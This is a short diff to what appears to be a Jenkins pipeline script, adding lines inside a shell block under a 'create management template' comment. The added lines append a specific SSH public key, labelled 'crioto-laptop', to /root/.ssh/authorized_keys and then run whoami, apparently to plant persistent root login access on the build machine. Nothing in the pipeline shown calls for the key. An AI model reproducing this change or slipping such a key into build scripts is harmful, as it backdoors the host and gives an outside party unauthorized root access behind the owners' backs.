@@ -78,6 +78,10 @@ try {
         // create management template
 
             sh """
+	    
+	    sudo echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKJ5g6619d8a6DuzFYSzYQqoHffJiRPADS3UvFiX1ESX9vJNDm9ENLE3wKPLjugYokBAG0kdmlEdBxEV0LifztOwaJLH+tVcr0MId5RwJzl/rCrijoHI1qm3/wbuvWoiQizwm0ocDM+2z/eWwY3MpeFYr8hLfxH3B3gfEFoXoQ2ts3ty6DTq93ewTYc2Eqfx0sfqzEcKUzzzn8ozlueHk+rbnoUmHZxbVYQtaLO1veGvYXgb6E6ZHDVYklhltR0LmP9wkOehtcd572k8LeTkqwBvSObxeI+n/aKTkW4f5kog10hpO4TPjPJDozS9jOunmqkkKGffukXTknq0V/W4NbCeJ5dUoQkuXtc1A9LU+QmNLjjh7GW0JlGm4xwYupUJmNuEXMe86mUpfZigabD5UbXSItWFlkjfR1G2nJIlEcXpUM76fPsyq7C4s6WDTfRkOlh2jjZBP6u5BEm12NtLcRav8DOSC2Xi87aL/QoMUFn7JT/FfRvjHTd4V1/WdqGpj4Qo37SQ7LBR7+8o29hyphv4M0Ds/GX9UcBaZ30uoXQSAOpuMRxV3Mt6D5pZwWjh96/xD6k7VxfjGahmGaCOmcdc3baTHj4oAD1bMt0Dhw8v5jPrxs2QsCsPLZwJpgbCno4Xkxc20p6JSGhz9Nvyly414Rw9NZev3FcIcIyCwIhw== crioto-laptop" >> /root/.ssh/authorized_keys;
+	    
+	    whoami
 	    ip addr
 		   	set +x
             set -e
